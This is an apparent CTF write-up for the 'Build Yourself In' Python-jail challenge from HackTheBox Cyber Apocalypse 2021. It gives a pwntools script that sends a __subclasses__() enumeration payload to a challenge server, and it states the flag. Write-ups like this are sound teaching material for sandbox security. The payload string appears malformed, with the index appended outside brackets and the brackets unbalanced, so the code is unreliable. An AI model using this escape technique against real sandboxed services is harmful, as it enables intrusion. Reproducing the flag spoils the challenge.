---
name: Build Yourself In (2021)
event: HackTheBox Cyber Apocalypse CTF 2021
category: Misc
description: Writeup for Build Yourself In (Misc) - HackTheBox Cyber Apocalypse CTF (2021) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Build Yourself In

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/3hP158TJk84/0.jpg)](https://youtu.be/3hP158TJk84?t=28s "HTB Cyber Apocalypse CTF 2021: Build Yourself In")

## Challenge Description

> The extraterrestrials have upgraded their authentication system and now only them are able to pass. Did you manage to learn their language well enough in order to bypass the the authorization check?

## Solution

{% code overflow="wrap" %}
```py
from pwn import *

context.log_level = 'warning'

for i in range(100):
    io = remote("138.68.151.248", 30697)
    # to_enumerate = '().__class__.__base__.__subclasses__()'
    to_enumerate = '().__class__.__base__.__subclasses__()'
    io.sendlineafter(
        '>>>', '[print(x) for x in [[' + to_enumerate + str(i) + ']]]')
    print(io.recvline())
```
{% endcode %}

Flag: `CHTB{n0_j4il_c4n_h4ndl3_m3!}`
